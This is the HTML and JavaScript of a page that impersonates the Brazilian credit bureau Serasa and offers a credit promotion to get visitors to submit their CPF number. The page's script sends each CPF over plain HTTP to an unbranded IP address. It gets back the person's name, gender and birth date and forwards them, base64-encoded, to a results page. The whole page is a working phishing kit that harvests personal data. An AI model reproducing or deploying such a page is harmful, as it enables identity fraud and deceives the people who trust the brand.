<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Serasa - Consultar CPF</title>
    <link href="images/favicon.png" rel="icon" type="image/x-icon">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', sans-serif; background-color: #F7F8F9; }
        .login-wrapper { display: flex; min-height: 100vh; position: relative; overflow: hidden; }
        .promo-panel { flex: 1; background-color: #E63888; color: white; padding: 50px; display: flex; flex-direction: column; }
        .promo-logo { width: 100px; height: 48px; }
        .promo-panel h1 { font-size: 48px; line-height: 1.2; font-weight: 700; max-width: 400px; margin-top: 40px; }
        .promo-image-center { position: absolute; bottom: 0; left: 45%; transform: translateX(-50%); width: 100%; max-width: 780px; z-index: 2; }
        .form-panel { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px; }
        .login-card { background-color: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.07); width: 100%; max-width: 400px; z-index: 1; }
        .mobile-logo { display: none; }
        .login-card h2 { font-size: 24px; color: #333; margin-bottom: 25px; font-weight: 700; text-align: left; }
        #cpf-input { width: 100%; padding: 14px 16px; border: 1px solid #CED4DA; border-radius: 8px; font-size: 16px; margin-bottom: 20px; }
        .remember-wrapper { display: flex; align-items: center; margin-bottom: 30px; }
        .remember-wrapper label { color: #555; font-size: 14px; cursor: pointer; }
        .toggle-switch { position: relative; display: inline-block; width: 44px; height: 24px; margin-right: 12px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 24px; }
        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 2px; bottom: 2px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: #E63888; }
        input:checked + .slider:before { transform: translateX(20px); }
        .cta-button { width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; background-color: #E63888; color: white; }
        .extra-links { margin-top: 30px; text-align: center; font-size: 14px; }
        .extra-links a { color: #E63888; text-decoration: none; font-weight: 700; }
        .extra-links p { margin-top: 20px; color: #888; }
        
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            display: none;
            text-align: center;
        }

        @media (max-width: 900px) {
            .promo-panel, .promo-image-center { display: none; }
            .form-panel { flex-basis: 100%; padding: 20px; background-color: #fff; align-items: flex-start; }
            .login-card { box-shadow: none; padding: 20px 10px; }
            .mobile-logo { display: block; width: 100px; height: 48px; margin-bottom: 30px; margin-left: -10px; }
        }
    </style>
</head>
<body>
<div id="modal-loading" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index:9999; align-items: center; justify-content: center;">
    <div style="background:white; padding:30px 40px; border-radius:10px; text-align:center; box-shadow: 0 2px 10px rgba(0,0,0,0.2);">
        <img alt="Logo Serasa" src="images/okk.png" style="width:40px; margin-bottom: 20px;">
        <h2 style="margin-bottom: 10px; color:#333;">Aguarde</h2>
        <p style="color:#555;">Estamos processando suas informações.</p>
    </div>
</div>

<div class="login-wrapper">
    <div class="promo-panel">
        <img alt="Logo Serasa" class="promo-logo" src="images/ok.png">
        <h1>Na Serasa você pode solicitar crédito de várias empresas.</h1>
    </div>
    <img alt="Homem" class="promo-image-center" src="images/43.png">
    <div class="form-panel">
        <form id="cpfForm" class="login-card">
            <img alt="Logo Serasa" class="mobile-logo" src="images/okk.png">
            <h2>Digite seu CPF</h2>
            <input id="cpf-input" inputmode="numeric" name="cpf" placeholder="000.000.000-00" required type="tel">
            <div class="remember-wrapper">
                <label class="toggle-switch">
                    <input id="remember-cpf" type="checkbox">
                    <span class="slider"></span>
                </label>
                <label for="remember-cpf">Lembrar CPF para o próximo acesso</label>
            </div>
            <button class="cta-button" type="submit">Continuar</button>
            <div class="extra-links">
                <a href="#">Veja aqui soluções para a sua empresa</a>
                <p>Termos de Uso e Política de Privacidade</p>
            </div>
        </form>

        <div id="error-message" class="error-message">
            CPF inválido para esta promoção. Tente novamente com outro CPF.
        </div>
    </div>
</div>

<script>
    document.addEventListener("DOMContentLoaded", function () {
        const form = document.querySelector('#cpfForm');
        
        form.addEventListener('submit', function (e) {
            e.preventDefault();

            const cpfInput = document.getElementById('cpf-input');
            const cpf = cpfInput.value.replace(/\D/g, '');

            if (!/^\d{11}$/.test(cpf)) {
                alert('CPF inválido. Use apenas números.');
                return;
            }

            document.getElementById('modal-loading').style.display = 'flex';

            // URL da nova API
            const apiURL = `http://185.101.104.231:3001/search?cpf=${cpf}`;

            fetch(apiURL)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Falha na requisição');
                    }
                    return response.text(); // Lê como texto puro (formato com separador "|")
                })
                .then(data => {
                    const dados = data.trim().split('|');

                    // Espera pelo menos 4 campos: CPF|NOME|GENERO|NASCIMENTO
                    if (dados.length >= 4 && dados[0] !== '') {
                        const userCpf = dados[0].trim();
                        const userName = dados[1].trim();
                        const userGender = dados[2].trim();
                        const userBirth = dados[3].trim();

                        // Codifica os dados em base64 para envio na URL
                        const encodedData = btoa(encodeURIComponent(`${userCpf}|${userName}|${userBirth}|${userGender}`));

                        window.location.href = `resultado.html?d=${encodedData}`;
                    } else {
                        document.getElementById('modal-loading').style.display = 'none';
                        document.getElementById('error-message').style.display = 'block';
                        setTimeout(() => {
                            document.getElementById('error-message').style.display = 'none';
                        }, 5000);
                    }
                })
                .catch(error => {
                    console.error("Erro ao consultar a API:", error);
                    alert("Erro ao processar sua solicitação.");
                    document.getElementById('modal-loading').style.display = 'none';
                });
        });
    });
</script>

<script>
    document.getElementById('cpf-input').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        e.target.value = value.slice(0, 14);
    });
</script>

</body>
</html>
